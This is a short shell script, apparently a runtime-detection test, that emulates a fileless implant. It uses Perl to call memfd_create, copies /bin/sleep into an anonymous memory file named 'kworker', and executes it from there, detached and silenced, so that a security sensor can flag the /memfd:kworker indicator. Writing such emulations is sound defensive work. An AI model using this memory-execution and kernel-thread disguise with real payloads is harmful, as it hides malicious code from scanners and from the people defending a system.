# category: runtime
# title: Fileless implant run from memory (memfd)
# indicator: /memfd:kworker
# The payload is copied into an anonymous memory file and executed from it: nothing is left on
# disk for a file scanner to find.
case $(uname -m) in
  x86_64) nr=319 ;;
  aarch64) nr=279 ;;
  *) exit 0 ;;
esac
setsid perl -e '
  my $name = "kworker"; my $fd = syscall('"$nr"', $name, 0); die "memfd: $!" if $fd < 0;
  open(my $out, ">&=", $fd) or die; open(my $in, "<", "/bin/sleep") or die;
  binmode $in; binmode $out; local $/; my $data = <$in>; print $out $data; close $in;
  select $out; $| = 1; print $out "";
  exec { "/proc/self/fd/$fd" } "kworker", "3600";
' </dev/null >/dev/null 2>&1 &
sleep 1
